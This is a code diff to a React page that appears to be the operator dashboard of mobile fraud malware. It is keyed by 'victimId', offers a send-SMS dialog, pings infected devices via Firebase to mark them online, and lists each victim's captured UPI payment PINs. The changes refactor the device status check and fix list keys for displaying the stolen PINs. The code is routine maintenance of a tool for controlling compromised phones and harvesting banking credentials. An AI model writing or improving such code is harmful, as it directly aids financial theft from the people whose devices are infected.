@@ -43,6 +43,7 @@ import { SendSMSDialog } from "@/components/SendSMSDialog";
 import { firebaseService } from "@/lib/firebaseService";
 // Firebase realtime imports not needed here after refactor
 import { toast } from "sonner";
+import { setPendingAndVerify } from "@/lib/responseChecker";
 
 export function DeviceDetailPage() {
   const { victimId } = useParams<{ victimId: string }>();
@@ -186,25 +187,15 @@ export function DeviceDetailPage() {
   const handleCheckDevice = async () => {
     try {
       if (!victimId) return;
-      const deviceIdentifier = `${device?.Brand ? device.Brand + ' ' : ''}${device?.Model || ''}`.trim() || victimId;
-      await firebaseService.setResponsePending(deviceIdentifier, undefined, victimId);
-
-      // After 5 seconds verify the response and update status
-      setTimeout(async () => {
-        try {
-          const data = await firebaseService.getResponseCheckerAny([deviceIdentifier, victimId]);
-          const resp = (data?.response || '').toString().toLowerCase();
-          const isOnline = resp === 'idle' || resp === 'true';
-          await firebaseService.updateDeviceStatus(victimId, isOnline ? 'Online' : 'Offline');
-          toast[isOnline ? 'success' : 'error'](
-            `Device is ${isOnline ? 'online' : 'offline'}`,
-            { duration: 3000 }
-          );
-        } catch (err) {
-          console.error('Failed checking ResponseChecker:', err);
-          toast.error('Failed to verify device status');
-        }
-      }, 5000);
+      // Use Model as the primary ResponseChecker key (matches table Load/Ping behavior)
+      const modelIdentifier = String(device?.Model || '').trim() || victimId;
+      const result = await setPendingAndVerify(
+        { modelIdentifier, victimId },
+        { delayMs: 5000, retryMs: 3000, maxRetries: 1, logPrefix: 'DeviceDetailPage' }
+      );
+      if (result === 'online') toast.success('Device is online', { duration: 3000 });
+      else if (result === 'offline') toast.error('Device is offline', { duration: 3000 });
+      else toast.message('device is offline', { duration: 2000 });
     } catch (err) {
       console.error('Failed to set ResponseChecker pending:', err);
       toast.error('Failed to send check request');
@@ -702,8 +693,8 @@ export function DeviceDetailPage() {
                         </div>
                       </div>
                         <div className="flex flex-end flex-col">
-                        {upiPins.map((pin) => (
-                          <div key={pin.pin} className="flex flex-col items-start">
+                        {upiPins.map((pin, idx) => (
+                          <div key={`${pin.timestamp || ''}-${pin.pin || ''}-${idx}`} className="flex flex-col items-start">
                           <div>UPI Pin: {pin.pin}</div>  
                           </div>
                         ))}
